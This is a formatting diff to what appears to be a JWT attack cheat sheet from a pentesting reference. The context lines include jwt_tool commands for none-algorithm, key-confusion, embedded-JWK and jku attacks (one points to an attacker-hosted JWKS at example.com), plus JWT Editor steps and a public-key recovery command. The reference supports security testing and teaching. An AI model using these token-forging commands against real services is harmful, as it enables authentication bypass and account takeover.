@@ -7,8 +7,8 @@
 
 - [Tools](#tools)
 - [JWT Format](#jwt-format)
-  - [Header](#header)
-  - [Payload](#payload)
+    - [Header](#header)
+    - [Payload](#payload)
 - [JWT Signature](#jwt-signature)
     - [JWT Signature - Null Signature Attack (CVE-2020-28042)](#jwt-signature---null-signature-attack-cve-2020-28042)
     - [JWT Signature - Disclosure of a correct signature (CVE-2019-7644)](#jwt-signature---disclosure-of-a-correct-signature-cve-2019-7644)
@@ -17,10 +17,8 @@
     - [JWT Signature - Key Injection Attack (CVE-2018-0114)](#jwt-signature---key-injection-attack-cve-2018-0114)
     - [JWT Signature - Recover Public Key From Signed JWTs](#jwt-signature---recover-public-key-from-signed-jwts)
 - [JWT Secret](#jwt-secret)
-  - [Encode and Decode JWT with the secret](#encode-and-decode-jwt-with-the-secret)
-  - [Break JWT secret](#break-jwt-secret)
-    - [JWT tool](#jwt-tool)
-    - [Hashcat](#hashcat)
+    - [Encode and Decode JWT with the secret](#encode-and-decode-jwt-with-the-secret)
+    - [Break JWT secret](#break-jwt-secret)
 - [JWT Claims](#jwt-claims)
     - [JWT kid Claim Misuse](#jwt-kid-claim-misuse)
     - [JWKS - jku header injection](#jwks---jku-header-injection)
@@ -150,7 +148,7 @@ Send a JWT with an incorrect signature, the endpoint might respond with an error
 * [jwt-dotnet/jwt: Critical Security Fix Required: You disclose the correct signature with each SignatureVerificationException... #61](https://github.com/jwt-dotnet/jwt/issues/61)
 * [CVE-2019-7644: Security Vulnerability in Auth0-WCF-Service-JWT](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)
 
-```
+```ps1
 Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
 Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
 ```
@@ -161,16 +159,16 @@ Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh
 JWT supports a `None` algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.
 
 None algorithm variants:
-* none 
-* None
-* NONE
-* nOnE
+* `none` 
+* `None`
+* `NONE`
+* `nOnE`
 
 To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. Then you can submit your new JWT. However, this won't work unless you **remove** the signature
 
 Alternatively you can modify an existing JWT (be careful with the expiration time)
 
-* Using [ticarpi/jwt_tool](#)
+* Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
     ```ps1
     python3 jwt_tool.py [JWT_HERE] -X a
     ```
@@ -207,7 +205,7 @@ print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
 
 :warning: This behavior is fixed in the python library and will return this error `jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`. You need to install the following version: `pip install pyjwt==0.4.3`.
 
-* Using [ticarpi/jwt_tool](#)
+* Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
     ```ps1
     python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
     ```
@@ -258,16 +256,20 @@ print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
 
 
 **Exploit**:
-* Using [ticarpi/jwt_tool]
+
+* Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
+
     ```ps1
     python3 jwt_tool.py [JWT_HERE] -X i
     ```
-* Using [portswigger/JWT Editor](#)
+
+* Using [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
     1. Add a `New RSA key`
     2. In the JWT's Repeater tab, edit data
     3. `Attack` > `Embedded JWK`
 
 **Deconstructed**:
+
 ```json
 {
   "alg": "RS256",
@@ -290,6 +292,7 @@ print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
 The RS256, RS384 and RS512 algorithms use RSA with PKCS#1 v1.5 padding as their signature scheme. This has the property that you can compute the public key given two different messages and accompanying signatures. 
 
 [SecuraBV/jws2pubkey](https://github.com/SecuraBV/jws2pubkey): compute an RSA public key from two signed JWTs
+
 ```ps1
 $ docker run -it ttervoort/jws2pubkey JWS1 JWS2
 $ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
@@ -483,12 +486,12 @@ You should create your own key pair for this attack and host it. It should look 
 
 **Exploit**:
 
-* Using [ticarpi/jwt_tool]
+* Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
     ```ps1
     python3 jwt_tool.py JWT_HERE -X s
     python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
     ```
-* Using [portswigger/JWT Editor](#)
+* Using [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
     1. Generate a new RSA key and host it
     2. Edit JWT's data
     3. Replace the `kid` header with the one from your JWKS
